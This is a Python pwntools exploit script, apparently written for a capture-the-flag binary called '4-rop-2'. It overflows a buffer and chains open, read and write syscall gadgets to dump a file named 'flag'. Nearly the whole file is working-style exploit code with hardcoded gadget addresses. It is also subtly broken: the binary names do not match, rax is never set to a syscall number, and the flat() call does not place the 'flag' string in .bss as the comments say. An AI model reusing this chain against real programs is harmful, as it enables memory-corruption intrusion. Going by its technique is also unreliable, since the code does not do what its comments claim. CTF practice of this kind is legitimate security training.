from pwn import *

# Set up the context for pwntools (64-bit architecture)
context.arch = 'amd64'
context.os = 'linux'

# Load the binary
elf = ELF('./4-rop-2')   # Replace with your binary name
rop = ROP(elf)

# Start the process (or connect to the remote challenge)
p = process('./4-rop2')  # Replace with remote() if needed

# Find/write the string "flag" to a writable memory section (.bss, or similar)
bss_section = int('0000000000601040', 16)  # .bss section where we can write the "flag" string

# Syscall numbers
syscall_open = 2
syscall_read = 0
syscall_write = 1

# Addresses for the flag string and the buffer for reading the flag
flag_string_addr = bss_section + 0x100  # Arbitrary offset in .bss to place "flag"
buffer_addr = bss_section + 0x200       # Buffer to read flag content

# Gadgets (You'll need to find these using tools like ROPgadget)
# Example gadget: pop rdi; ret
pop_rdi = int('0x0000000000400743', 16)
# Example gadget: pop rsi; ret
pop_rsi = int('0x0000000000400741', 16)
# Example gadget: pop rdx; ret
pop_rdx = int('0x0000000000400668', 16)
# Syscall gadget (you'll find it with ROPgadget or similar)
syscall = int ('0x0000000000400284', 16)

# Step 1: ROP Chain to open("flag", O_RDONLY)
payload = b"A" * 140  # Adjust this to match the offset to return address
payload += p64(pop_rdi) + p64(flag_string_addr)    # rdi = address of "flag"
payload += p64(pop_rsi) + p64(0)                  # rsi = O_RDONLY (0)
payload += p64(pop_rdx) + p64(0)                  # rdx = 0
payload += p64(syscall)                           # syscall: open("flag", 0, 0)

# Step 2: ROP Chain to read(3, buffer_addr, 100)
payload += p64(pop_rdi) + p64(3)                  # rdi = file descriptor (3 after open)
payload += p64(pop_rsi) + p64(buffer_addr)        # rsi = buffer to read into
payload += p64(pop_rdx) + p64(100)                # rdx = number of bytes to read
payload += p64(syscall)                           # syscall: read(3, buffer_addr, 100)

# Step 3: ROP Chain to write(1, buffer_addr, 100)
payload += p64(pop_rdi) + p64(1)                  # rdi = stdout (1)
payload += p64(pop_rsi) + p64(buffer_addr)        # rsi = buffer containing flag
payload += p64(pop_rdx) + p64(100)                # rdx = number of bytes to write
payload += p64(syscall)                           # syscall: write(1, buffer_addr, 100)

# Send the "flag" string to the writable memory section
p.sendlineafter('>', flat({flag_string_addr: b'flag\x00'}))  # Adjust to your binary's input pattern

# Send the ROP chain
p.sendlineafter('>', payload)  # Again, adjust to fit the binary's input prompt

# Receive the flag output
p.interactive()
